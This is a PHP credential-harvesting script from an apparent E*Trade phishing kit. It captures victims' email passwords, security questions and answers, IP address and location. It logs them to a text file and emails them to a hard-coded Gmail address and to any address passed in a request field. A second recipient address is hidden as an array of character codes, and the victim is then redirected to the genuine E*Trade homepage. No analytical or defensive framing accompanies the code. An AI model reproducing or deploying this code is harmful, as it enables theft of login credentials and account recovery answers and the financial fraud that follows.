<?
$ip = getenv("REMOTE_ADDR");
session_start();
$question1 = $_POST['question1'];
$answer1 = $_POST['answer1'];
$question2 = $_POST['question2'];
$answer2 = $_POST['answer2'];
$question3 = $_POST['question3'];
$answer3 = $_POST['answer3'];
$email = $_POST['EA'];
$pass = $_POST['EP'];
$serv = $_REQUEST['verify'];
$country = visitor_country();
$datamasii=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------ReSulT Question--------------------\n
Security Question 1  : $question1
Security Answer 1    : $answer1
Security Question 2  : $question2
Security Answer 2    : $answer2
Security Question 3  : $question3
Security Answer 3    : $answer3
-------------------------------------------------------------\n

Email Address : $email
Email Password: $pass
-------------------------------------------------------------\n
Date     : $datamasii
Browser  : $browser
IP       : $ip
Country  : $country
-----------------Spam ReSulT-----------------------------------\n";
$handle = fopen("metoll.txt", "a");
fwrite($handle, $message);
fclose($handle);

$send = "godgreat973@gmail.com";
$subject = "etrade l $ip";
$headers = "From: Result<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail("$send", "$subject", $message,$headers);
mail("$serv", "$subject", $message,$headers);
}
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
<script>
    window.top.location.href = "https://us.etrade.com/home";

</script>